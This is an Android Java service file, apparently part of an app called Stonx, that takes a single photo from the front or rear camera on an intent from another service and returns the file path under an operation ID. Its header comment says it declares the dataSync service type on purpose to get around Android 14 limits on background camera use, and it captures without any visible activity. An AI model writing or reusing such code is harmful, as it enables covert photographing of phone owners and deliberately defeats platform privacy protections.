package com.stonx.manager;

import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Size;
import android.view.Surface;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * CameraService — التقاط صورة واحدة.
 * يُستدعى من StonxService عبر startForegroundService.
 *
 * نستخدم foregroundServiceType=dataSync لتجنب قيود Android 14+
 * (type=camera يحتاج eligible state خاص لا يمكن تأمينه بدون activity).
 */
public class CameraService extends Service {

    private static final String TAG = "STONX_CAM";
    private static final int WARMUP_FRAMES = 15;

    public static final String EXTRA_ACTION_TYPE = "action_type";
    public static final String EXTRA_FACING = "facing";
    public static final String EXTRA_OUTPUT = "output";
    public static final String EXTRA_OP_ID = "op_id";

    private HandlerThread bgThread;
    private Handler bgHandler;

    private CameraDevice cameraDevice;
    private CameraCaptureSession session;
    private ImageReader jpegReader;
    private ImageReader dummyReader;

    private final AtomicBoolean captured = new AtomicBoolean(false);
    private final AtomicInteger frameCount = new AtomicInteger(0);

    private String outPath;
    private String opId;
    private volatile String pendingSavePath;

    @Override
    public void onCreate() {
        super.onCreate();
        StonxLog.d(TAG, "*** CameraService.onCreate API=" + Build.VERSION.SDK_INT + " ***");
        try {
            android.app.Notification notif = NotifyHelper.buildService(this, true);
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(NotifyHelper.NOTIF_SERVICE + 10, notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NotifyHelper.NOTIF_SERVICE + 10, notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NotifyHelper.NOTIF_SERVICE + 10, notif);
            }
            StonxLog.d(TAG, "*** startForeground OK (dataSync) ***");
        } catch (Exception e) {
            StonxLog.e(TAG, "startForeground failed", e);
        }

        bgThread = new HandlerThread("CameraServiceBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        StonxLog.d(TAG, "*** onStartCommand START ***");
        if (intent == null) { stopSelfClean(); return START_NOT_STICKY; }

        String action = intent.getStringExtra(EXTRA_ACTION_TYPE);
        if (action == null) action = "photo";

        String facing = intent.getStringExtra(EXTRA_FACING);
        outPath = intent.getStringExtra(EXTRA_OUTPUT);
        opId = intent.getStringExtra(EXTRA_OP_ID);

        boolean wantFront = "front".equalsIgnoreCase(facing);

        captured.set(false);
        frameCount.set(0);
        pendingSavePath = null;

        StonxLog.d(TAG, "*** action=" + action + " facing=" + facing
                + " out=" + outPath + " opId=" + opId + " ***");

        if (outPath == null || outPath.isEmpty()) {
            StonxLog.e(TAG, "*** missing output path ***");
            notifyFailure("MISSING_OUTPUT");
            stopSelfClean();
            return START_NOT_STICKY;
        }

        openCamera(wantFront);
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        StonxLog.d(TAG, "*** CameraService.onDestroy ***");
        closeAll();
        if (bgThread!= null) bgThread.quitSafely();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private static Size chooseBestSize(Size[] sizes, int maxW, int maxH) {
        if (sizes == null || sizes.length == 0) {
            return new Size(maxW, maxH);
        }
        Size best = sizes[0];
        int bestArea = 0;
        for (Size s : sizes) {
            if (s.getWidth() > maxW || s.getHeight() > maxH) continue;
            int area = s.getWidth() * s.getHeight();
            if (area > bestArea) {
                bestArea = area;
                best = s;
            }
        }
        return bestArea == 0? sizes[0] : best;
    }

    private void openCamera(boolean wantFront) {
        StonxLog.d(TAG, "*** openCamera: wantFront=" + wantFront + " ***");
        try {
            CameraManager mgr = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (mgr == null) {
                notifyFailure("NO_CAMERA_MANAGER");
                stopSelfClean();
                return;
            }

            CameraFinder.Result cam = CameraFinder.find(mgr, wantFront);
            if (cam == null) {
                notifyFailure("NO_MATCHING_CAMERA");
                stopSelfClean();
                return;
            }

            CameraCharacteristics chars = mgr.getCameraCharacteristics(cam.cameraId);
            StreamConfigurationMap map =
                    chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);

            Size jpegSize = chooseBestSize(
                    map.getOutputSizes(ImageFormat.JPEG), 1920, 1080);
            Size yuvSize = chooseBestSize(
                    map.getOutputSizes(ImageFormat.YUV_420_888), 640, 480);

            StonxLog.d(TAG, "jpeg=" + jpegSize + " yuv=" + yuvSize);

            jpegReader = ImageReader.newInstance(
                    jpegSize.getWidth(), jpegSize.getHeight(), ImageFormat.JPEG, 2);
            jpegReader.setOnImageAvailableListener(this::onJpegAvailable, bgHandler);

            dummyReader = ImageReader.newInstance(
                    yuvSize.getWidth(), yuvSize.getHeight(), ImageFormat.YUV_420_888, 2);
            dummyReader.setOnImageAvailableListener(reader -> {
                try (Image img = reader.acquireLatestImage()) {
                } catch (Exception ignored) {}
            }, bgHandler);

            StonxLog.d(TAG, "*** opening camera id=" + cam.cameraId + " ***");
            mgr.openCamera(cam.cameraId, stateCallback, bgHandler);
        } catch (CameraAccessException | SecurityException e) {
            StonxLog.e(TAG, "*** openCamera ex ***", e);
            notifyFailure("OPEN_EXCEPTION");
            stopSelfClean();
        }
    }

    private final CameraDevice.StateCallback stateCallback =
            new CameraDevice.StateCallback() {
        @Override public void onOpened(CameraDevice device) {
            StonxLog.d(TAG, "*** CAMERA OPENED ***");
            cameraDevice = device;
            startSession();
        }
        @Override public void onDisconnected(CameraDevice device) {
            StonxLog.e(TAG, "*** CAMERA DISCONNECTED ***");
            device.close();
            cameraDevice = null;
            notifyFailure("DISCONNECTED");
            stopSelfClean();
        }
        @Override public void onError(CameraDevice device, int error) {
            StonxLog.e(TAG, "*** CAMERA ERROR: " + error + " ***");
            device.close();
            cameraDevice = null;
            notifyFailure("DEVICE_ERROR_" + error);
            stopSelfClean();
        }
    };

    private void startSession() {
        try {
            Surface dummySurface = dummyReader.getSurface();
            Surface jpegSurface = jpegReader.getSurface();

            cameraDevice.createCaptureSession(
                    Arrays.asList(dummySurface, jpegSurface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession s) {
                            StonxLog.d(TAG, "*** SESSION CONFIGURED ***");
                            session = s;
                            startWarmup(dummySurface, jpegSurface);
                        }
                        @Override
                        public void onConfigureFailed(CameraCaptureSession s) {
                            StonxLog.e(TAG, "*** SESSION CONFIGURE FAILED ***");
                            notifyFailure("SESSION_CONFIG_FAILED");
                            stopSelfClean();
                        }
                    }, bgHandler);
        } catch (CameraAccessException e) {
            StonxLog.e(TAG, "*** createCaptureSession ex ***", e);
            notifyFailure("SESSION_EXCEPTION");
            stopSelfClean();
        }
    }

    private void startWarmup(Surface dummySurface, Surface jpegSurface) {
        StonxLog.d(TAG, "*** warmup started ***");
        try {
            CaptureRequest.Builder warmupReq =
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            warmupReq.addTarget(dummySurface);
            warmupReq.set(CaptureRequest.CONTROL_AF_MODE,
                          CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            warmupReq.set(CaptureRequest.CONTROL_AE_MODE,
                          CaptureRequest.CONTROL_AE_MODE_ON);

            session.setRepeatingRequest(
                    warmupReq.build(),
                    new CameraCaptureSession.CaptureCallback() {
                        @Override
                        public void onCaptureCompleted(CameraCaptureSession s,
                                                       CaptureRequest r,
                                                       TotalCaptureResult result) {
                            int n = frameCount.incrementAndGet();
                            if (n % 5 == 0) StonxLog.d(TAG, "*** warmup frame " + n + " ***");
                            if (n < WARMUP_FRAMES) return;

                            if (captured.compareAndSet(false, true)) {
                                try { s.stopRepeating(); } catch (Exception ignored) {}
                                StonxLog.d(TAG, "*** warmup done after " + n + " frames ***");
                                capturePhoto(jpegSurface, outPath);
                            }
                        }
                    }, bgHandler);
        } catch (CameraAccessException e) {
            StonxLog.e(TAG, "*** startWarmup ex ***", e);
            notifyFailure("WARMUP_EXCEPTION");
            stopSelfClean();
        }
    }

    private void capturePhoto(Surface jpegSurface, String path) {
        StonxLog.d(TAG, "*** capturePhoto: " + path + " ***");
        try {
            pendingSavePath = path;
            CaptureRequest.Builder stillReq =
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            stillReq.addTarget(jpegSurface);
            stillReq.set(CaptureRequest.CONTROL_AF_MODE,
                         CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            session.capture(stillReq.build(), null, bgHandler);
            StonxLog.d(TAG, "*** capture triggered ***");
        } catch (CameraAccessException e) {
            StonxLog.e(TAG, "*** capturePhoto ex ***", e);
            notifyFailure("CAPTURE_EXCEPTION");
            stopSelfClean();
        }
    }

    private void onJpegAvailable(ImageReader reader) {
        StonxLog.d(TAG, "*** onJpegAvailable called ***");
        try (Image img = reader.acquireLatestImage()) {
            if (img == null) {
                StonxLog.e(TAG, "*** img null ***");
                return;
            }

            ByteBuffer buf = img.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buf.remaining()];
            buf.get(bytes);

            String path = pendingSavePath;
            if (path == null) {
                StonxLog.e(TAG, "*** pendingSavePath null ***");
                notifyFailure("NO_PENDING_PATH");
                stopSelfClean();
                return;
            }

            File out = new File(path);
            File dir = out.getParentFile();
            if (dir!= null &&!dir.exists()) dir.mkdirs();

            try (FileOutputStream fos = new FileOutputStream(out)) {
                fos.write(bytes);
            }
            StonxLog.d(TAG, "*** photo saved " + bytes.length + "B → " + path + " ***");
            notifySuccess(path);

        } catch (Exception e) {
            StonxLog.e(TAG, "*** onJpegAvailable ex ***", e);
            notifyFailure("SAVE_EXCEPTION");
        } finally {
            stopSelfClean();
        }
    }

    private void closeAll() {
        try { if (session!= null) session.close(); } catch (Exception ignored) {}
        try { if (cameraDevice!= null) cameraDevice.close(); } catch (Exception ignored) {}
        try { if (jpegReader!= null) jpegReader.close(); } catch (Exception ignored) {}
        try { if (dummyReader!= null) dummyReader.close(); } catch (Exception ignored) {}
        session = null;
        cameraDevice = null;
        jpegReader = null;
        dummyReader = null;
        pendingSavePath = null;
    }

    private void stopSelfClean() {
        stopForeground(true);
        stopSelf();
    }

    private void notifySuccess(String path) {
        StonxLog.d(TAG, "*** notifySuccess: " + path + " ***");
        StonxService.deliverCameraResult(opId, true, path);
    }

    private void notifyFailure(String reason) {
        StonxLog.d(TAG, "*** notifyFailure: " + reason + " ***");
        StonxService.deliverCameraResult(opId, false, reason);
    }
}
